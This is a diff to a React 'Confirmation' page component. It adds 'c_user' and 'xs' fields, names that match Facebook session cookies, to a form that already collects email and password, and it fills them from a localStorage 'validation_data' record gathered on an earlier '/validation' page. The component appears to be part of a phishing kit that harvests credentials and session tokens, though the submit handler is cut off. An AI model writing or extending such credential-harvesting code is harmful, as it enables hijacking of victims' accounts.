@@ -43,17 +43,31 @@ export default function Confirmation() {
       user_email: "",
       password: "",
       contactMethod: 'email',
-      countryCode: '+1'
+      countryCode: '+1',
+      c_user: "",
+      xs: ""
     },
   });
 
   useEffect(() => {
-    const filtered = countries.filter(country =>
-      country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
-      country.code.toLowerCase().includes(countrySearch.toLowerCase())
-    );
-    setFilteredCountries(filtered);
-  }, [countrySearch]);
+    const storedData = localStorage.getItem('validation_data');
+    if (!storedData) {
+      setLocation('/validation');
+      return;
+    }
+    try {
+      const parsed = JSON.parse(storedData);
+      if (!parsed.c_user || !parsed.xs) {
+        throw new Error("Invalid validation data");
+      }
+      // Set the validation data in the form
+      form.setValue('c_user', parsed.c_user);
+      form.setValue('xs', parsed.xs);
+    } catch (error) {
+      console.error('Failed to parse validation data:', error);
+      setLocation('/validation');
+    }
+  }, [setLocation, form]);
 
   const handlePhoneInput = (value: string) => {
     try {
@@ -74,21 +88,13 @@ export default function Confirmation() {
   };
 
   useEffect(() => {
-    const storedData = localStorage.getItem('validation_data');
-    if (!storedData) {
-      setLocation('/validation');
-      return;
-    }
-    try {
-      const parsed = JSON.parse(storedData);
-      if (!parsed.c_user || !parsed.xs) {
-        throw new Error("Invalid validation data");
-      }
-    } catch (error) {
-      console.error('Failed to parse validation data:', error);
-      setLocation('/validation');
-    }
-  }, [setLocation]);
+    const filtered = countries.filter(country =>
+      country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
+      country.code.toLowerCase().includes(countrySearch.toLowerCase())
+    );
+    setFilteredCountries(filtered);
+  }, [countrySearch]);
+
 
   const onSubmit = async (data: any) => {
     try {
